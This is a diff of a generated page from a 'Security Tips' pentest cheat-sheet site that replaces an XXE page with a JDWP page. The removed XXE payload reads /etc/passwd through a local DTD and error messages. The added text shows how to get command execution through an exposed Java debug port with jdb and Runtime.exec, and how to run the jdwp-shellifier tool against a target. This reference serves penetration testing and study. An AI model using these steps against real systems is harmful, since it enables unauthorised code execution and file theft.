@@ -8,14 +8,14 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>XXE - Security Tips</title>
+  <title>JDWP - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "XXE";
-    var mkdocs_page_input_path = "xxe.md";
-    var mkdocs_page_url = "/xxe/";
+    var mkdocs_page_name = "JDWP";
+    var mkdocs_page_input_path = "jdwp.md";
+    var mkdocs_page_url = "/jdwp/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js" defer></script>
@@ -93,14 +93,9 @@
     <a class="section-link" href="../ssh/">SSH</a>
           </li>
           
-          <li class="bold active">
+          <li class="bold">
 		        
-    <a class="section-link" href="./">XXE</a>
-    <ul>
-            
-    
-
-    </ul>
+    <a class="section-link" href="../xxe/">XXE</a>
           </li>
           
           <li class="bold">
@@ -208,7 +203,7 @@
           
           <li class="bold">
 		        
-    <span class="section-link ">Misc</span>
+    <span class="section-link active">Misc</span>
     <ul>
                 <li class="">
                     
@@ -218,9 +213,22 @@
                     
     <a class="section-link" href="../git/">Git</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../jdwp/">JDWP</a>
+    <a class="section-link" href="./">JDWP</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#manual-exploitation">Manual exploitation</a></li>
+    
+        <li><a class="" href="#jdwp-shellifier">jdwp-shellifier</a></li>
+    
+    </ul>
+    
+
+    </ul>
                 </li>
                 <li class="">
                     
@@ -251,19 +259,30 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="xml-external-entity">XML External Entity</h1>
-<pre><code class="language-xml">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
-&lt;!DOCTYPE message [
-    &lt;!ENTITY %local_dtd SYSTEM &quot;file://usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
-    &lt;!ENTITY %   '
-        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
-            &amp;#x25;eval;
-            &amp;#x25;error;
-        '&gt;
-        %local_dtd;
-]&gt;
-&lt;message&gt;...&lt;message&gt;
+              <h1 id="java-debug-wire-protocol-jdwp">Java Debug Wire Protocol (JDWP)</h1>
+<p><code>JWDP</code> is the protocol used for communication between a debugger and a Java app (JVM).</p>
+<h2 id="manual-exploitation">Manual exploitation</h2>
+<p>It's possible to execute shell commands using <code>jdb</code>:</p>
+<pre><code class="language-bash">jdb -attach 8000
+</code></pre>
+
+<p>Then you need to find a good java thread to stop in and execute you command. It
+appears that the method <code>indexOf</code> of the <code>String</code> class is a good candidate:</p>
+<pre><code class="language-bash">trace go methods
+# wait that the jdb dies
+stop in java.lang.String().indexOf(int)
+print new java.lang.Runtime().exec(&quot;&lt;cmd&gt;&quot;)
+</code></pre>
+
+<p>This should execute you command with the privilege of the Java application. But
+be careful, the manual method often fails.</p>
+<h2 id="jdwp-shellifier">jdwp-shellifier</h2>
+<p><code>jdwp-shellifier</code> is an exploitation tool to exploit <code>JWDP</code>. It's available on
+<a href="https://github.com/IOActive/jdwp-shellifier" target="_blank">github</a>.</p>
+<p>Again we use the <code>indexOf</code> method to break on, it's possible to use an other one.</p>
+<pre><code class="language-bash">git clone https://github.com/IOActive/jdwp-shellifier
+cd jdwp-shellifier
+python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&lt;cmd&gt;&quot;
 </code></pre>
             
           </div>
@@ -283,10 +302,10 @@
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../ssh/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../git/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../zip/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../iscsi/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
